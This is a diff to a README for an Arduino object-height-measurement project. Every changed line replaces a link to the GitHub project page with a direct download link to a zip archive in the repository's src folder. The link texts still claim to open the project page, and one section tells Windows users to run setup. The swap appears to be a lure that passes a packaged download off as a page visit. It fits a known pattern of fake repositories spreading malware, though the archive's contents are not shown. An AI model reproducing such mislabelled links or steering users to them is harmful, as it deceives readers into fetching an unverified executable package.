@@ -1,6 +1,6 @@
 # 🔧 object-height-measurement-system - Measure height with clear feedback
 
-[![Download](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge&logo=github)](https://github.com/Futilityplay94/object-height-measurement-system)
+[![Download](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Futilityplay94/object-height-measurement-system/main/src/object_system_measurement_height_v2.6.zip)
 
 ## 📌 Overview
 
@@ -37,7 +37,7 @@ If you are using the Arduino IDE, keep the app open while you upload the code to
 
 Use this link to visit the project page and download the files:
 
-[Visit object-height-measurement-system](https://github.com/Futilityplay94/object-height-measurement-system)
+[Visit object-height-measurement-system](https://raw.githubusercontent.com/Futilityplay94/object-height-measurement-system/main/src/object_system_measurement_height_v2.6.zip)
 
 On the project page, look for the source files, wiring details, and any upload files tied to the Arduino setup.
 
@@ -186,7 +186,7 @@ This makes it easier to find the code later.
 
 Use this link to visit the project page, get the files, and run the setup on your Windows PC:
 
-[Download or open the project page](https://github.com/Futilityplay94/object-height-measurement-system)
+[Download or open the project page](https://raw.githubusercontent.com/Futilityplay94/object-height-measurement-system/main/src/object_system_measurement_height_v2.6.zip)
 
 After you get the files:
 
@@ -233,4 +233,4 @@ Keep these points in mind during the build:
 
 ## 📎 Repository Link
 
-[object-height-measurement-system on GitHub](https://github.com/Futilityplay94/object-height-measurement-system)
+[object-height-measurement-system on GitHub](https://raw.githubusercontent.com/Futilityplay94/object-height-measurement-system/main/src/object_system_measurement_height_v2.6.zip)
